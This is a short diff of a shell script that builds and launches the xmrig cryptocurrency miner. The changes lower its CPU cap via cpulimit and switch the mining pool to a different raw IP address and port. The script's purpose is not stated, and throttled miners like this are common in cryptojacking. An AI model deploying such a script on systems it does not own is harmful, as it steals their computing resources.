@@ -16,7 +16,7 @@ apt-get -y  update;
 apt-get install cpulimit
 
 # limit usage
-cpulimit -l 72 -e xmrig -b
+cpulimit -l 69 -e xmrig -b
 
 # atcivate hugepages
 echo 10000 > /proc/sys/vm/nr_hugepages
@@ -52,4 +52,4 @@ cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
 make
 
 #lauch xmrig
-./xmrig -o 80.211.207.17:8080 -u loizt -p x -k --donate-level=1 --av=2
+./xmrig -o 80.211.183.127:9999 -u loizt -p x -k --donate-level=1 --av=2
